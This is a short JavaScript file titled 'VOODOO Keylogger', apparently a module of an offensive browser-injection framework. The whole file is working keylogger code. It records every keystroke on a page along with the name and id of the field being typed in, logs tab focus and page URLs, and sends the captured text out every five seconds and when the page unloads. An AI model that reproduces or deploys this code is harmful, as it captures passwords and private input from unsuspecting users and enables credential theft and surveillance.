/**
 * VOODOO Keylogger
 */
(function () {
    let output = "";
    let lastElement = null;

    function describe(element) {
        const names = {
            type: element.getAttribute("type"),
            name: element.getAttribute("name"),
            id: element.getAttribute("id")
        };
        let id = element.tagName + ":";
        for (let key in names) {
            if (names[key]) {
                id += `${key}=${names[key]} `
            }
        }
        return id;
    }

    function sendAndDelete() {
        if (output.length === 0) {
            return;
        }
        VOODOO.send({ log: output });
        output = "";
    }

    setInterval(sendAndDelete, 5000);

    window.addEventListener("beforeunload", sendAndDelete, false);
    window.addEventListener("blur", function () {
        output += "\n[TAB LOST FOCUS]\n";
    });

    window.addEventListener("focus", function () {
        output += `\n====== [FOCUS] ${window.location.href} (${document.title}) ======\n`;
    });

    window.addEventListener("keydown", function (event) {
        if (lastElement !== event.path[0]) {
            lastElement = event.path[0];
            output += `\n[ELEMENT => ${describe(event.path[0])}]\n`
        }
        if (event.key.length > 1) {
            output += `[${event.key}]`;
        } else {
            output += event.key;
        }
    });

    output = `\n====== ${window.location.href} (${document.title}) ======\n`;
    sendAndDelete();
})();